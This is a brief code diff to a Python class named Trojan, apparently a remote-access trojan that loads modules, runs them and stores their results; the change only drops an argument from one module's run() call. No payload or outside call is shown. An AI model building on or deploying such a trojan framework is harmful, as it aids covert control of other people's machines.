@@ -70,7 +70,7 @@ class Trojan:
         return config
 
     def module_runner(self, module):
-        result = sys.modules[module].run(self.os)
+        result = sys.modules[module].run()
         self.store_module_result(result, module)
 
     def store_module_result(self, data, module):
